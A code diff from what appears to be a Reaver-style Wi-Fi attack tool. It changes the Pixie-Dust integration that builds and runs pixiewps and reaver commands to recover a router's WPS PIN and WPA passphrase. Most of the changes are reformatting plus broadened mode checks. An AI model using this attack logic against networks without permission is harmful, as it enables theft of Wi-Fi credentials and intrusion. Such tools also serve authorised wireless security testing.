@@ -1702,25 +1702,26 @@ static int wps_process_enrollee_nonce(struct wps_data *wps, const u8 *e_nonce)
     memset(cmd_pixie_aux,0,sizeof(cmd_pixie_aux));
     strcat(cmd_pixie,"pixiewps ");
    
-    if(globule->op_pixie==2)
+    if(globule->op_pixie==1 || globule->op_pixie==2 || globule->op_pixie==3)
     {
       strcat(cmd_pixie," -n "); 
     }
     printf("[P] E-Nonce: ");
     int pixiecnt = 0;
-    for (; pixiecnt < WPS_NONCE_LEN; pixiecnt++) {
+    for (; pixiecnt < WPS_NONCE_LEN; pixiecnt++) 
+    {
         printf("%02x", wps->nonce_e[pixiecnt]);
-        if(globule->op_pixie==2)
+        if(globule->op_pixie==1 || globule->op_pixie==2 || globule->op_pixie==3)
         {
-	  sprintf(cmd_pixie_aux, "%02x",  wps->nonce_e[pixiecnt]);
-	  strcat(cmd_pixie,cmd_pixie_aux);
-	}
+            sprintf(cmd_pixie_aux, "%02x",  wps->nonce_e[pixiecnt]);
+            strcat(cmd_pixie,cmd_pixie_aux);
+        }
         if (pixiecnt != WPS_NONCE_LEN - 1) {
             printf(":");
-            if(globule->op_pixie==2)
-	    {
-		 strcat(cmd_pixie,":");
-	    }
+            if(globule->op_pixie==1 || globule->op_pixie==2 || globule->op_pixie==3)
+            {
+                strcat(cmd_pixie,":");
+            }
         }
     }
     printf("\n");
@@ -1832,8 +1833,9 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
     printf("\n");
     /******/
 
-    if(globule->op_pixie==1 || globule->op_pixie==2){
-        strcat(cmd_pixie," -S ");
+    if(globule->op_pixie==1 || globule->op_pixie==2 || globule->op_pixie==3){
+        //strcat(cmd_pixie," -S ");
+        strcat(cmd_pixie," ");
     }
     //sprintf(cmd_pixie,"%s -S",cmd_pixie);
 	
@@ -1850,21 +1852,22 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
             //return -1;
         }
 
-	int pixie_test=0;
+        int pixie_test=0;
         char pixie_pin[16];
-	char *aux_pixie_pin;
+        char *aux_pixie_pin;
         
         memset(pixie_pin, 0, sizeof(pixie_pin));
 
-        while (fgets(pixie_buf_aux, 4000, fpixe) != NULL) {
+        while (fgets(pixie_buf_aux, 4000, fpixe) != NULL) 
+        {
             
             printf("[Pixie-Dust]  %s", pixie_buf_aux);
- 
+
             aux_pixie_pin = strstr(pixie_buf_aux,"WPS pin not found");
             if(aux_pixie_pin != NULL)
             {
-		pixie_test = 0;
-		//exit(0);
+                pixie_test = 0;
+                //exit(0);
             }
             
             aux_pixie_pin = strstr(pixie_buf_aux,"WPS pin:");
@@ -1875,9 +1878,6 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
                 //here will get the pin
                 strncpy(pixie_pin, aux_pixie_pin+9, 8);
             }
-            
-
-           
             
         }
 
@@ -1896,7 +1896,7 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
             //strcat(globule->cmd_reaver_test,pixie_pin);
             
             char cmd_reaver_test_aux[4000];
-	    char cmd_buf_c[5];
+            char cmd_buf_c[5];
             
             memset(cmd_reaver_test_aux, 0, sizeof(cmd_reaver_test_aux));
             memset(cmd_buf_c, 0, sizeof(cmd_buf_c));
@@ -1906,9 +1906,7 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
 
             strcat(cmd_reaver_test_aux," -b ");
             strcat(cmd_reaver_test_aux,mac2str(get_bssid(),':'));
-            
-
-            
+                       
             strcat(cmd_reaver_test_aux," -c ");
             snprintf(cmd_buf_c, sizeof(cmd_buf_c), "%d",get_channel());
             strcat(cmd_reaver_test_aux,cmd_buf_c);
@@ -1931,20 +1929,18 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
             while (fgets(pixie_buf_aux2, 4000, fpixe_test) != NULL) 
             {
                 
-	       if(strstr(pixie_buf_aux2,"[+] WPS PIN:")!=NULL)
-               {
-                   printf("[Reaver Test] %s", pixie_buf_aux2);
-               }
+                if(strstr(pixie_buf_aux2,"[+] WPS PIN:")!=NULL)
+                {
+                    printf("[Reaver Test] %s", pixie_buf_aux2);
+                }
                 if(strstr(pixie_buf_aux2,"[+] WPA PSK:")!=NULL)
-               {
-                   printf("[Reaver Test] %s", pixie_buf_aux2);
-               }
-               if(strstr(pixie_buf_aux2,"[+] AP SSID:")!=NULL)
-               {
-                   printf("[Reaver Test] %s", pixie_buf_aux2);
-               }
-
-
+                {
+                    printf("[Reaver Test] %s", pixie_buf_aux2);
+                }
+                if(strstr(pixie_buf_aux2,"[+] AP SSID:")!=NULL)
+                {
+                    printf("[Reaver Test] %s", pixie_buf_aux2);
+                }
 
             }
 
@@ -1952,9 +1948,6 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
             //printf("Command not found or exited with error status\n");
             //return -1;
             }
-
-
-
 
             exit(0);
         }
